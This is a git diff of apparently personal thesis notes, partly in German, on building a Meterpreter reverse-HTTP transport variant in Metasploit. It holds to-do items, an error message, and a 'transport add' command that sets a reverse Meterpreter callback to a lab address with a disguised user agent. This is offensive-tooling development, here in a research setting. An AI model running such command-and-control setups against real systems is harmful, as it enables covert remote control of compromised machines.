@@ -245,7 +245,15 @@ sudo docker build -t myopenresty -f bionic/Dockerfile .;sudo docker run -p80:80 
 
 * Code cleanup on reading 
 
+* User agent is not displayed (saved?) when changing transports
 
+* difference initial transport and transport switching
+
+*  in `lib/rex/payloads/meterpreter/config.rb` there is no size restriction/check (for example in `to_str(item,size)`)
+
+* what happens with specific byte sequences (edge cases) in lua?
+
+* Grafik welche darstellt wie die config erstellt wird (mit padding und so) siehe config.h
 
 # Bisherige Schritte
 
@@ -260,5 +268,11 @@ sudo docker build -t myopenresty -f bionic/Dockerfile .;sudo docker run -p80:80 
 * `/home/timo/Tools/bachelor/metasploit-framework/lib/rex/post/meterpreter`
 
 * `transport add -t reverse_mhttp -l 192.168.42.131 -p 5555 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"`
+
+ Payload generation failed: comparison of Integer with nil failed
+
+ git remote add upstream git://github.com/rapid7/REPO-YOU-FORKED-FROM.git
+git fetch upstream
+
 
 # * Anstatt derzeitiger loesung mit flag die umschaellt wie bei wininet, neue loesung mit url mhttp!!!
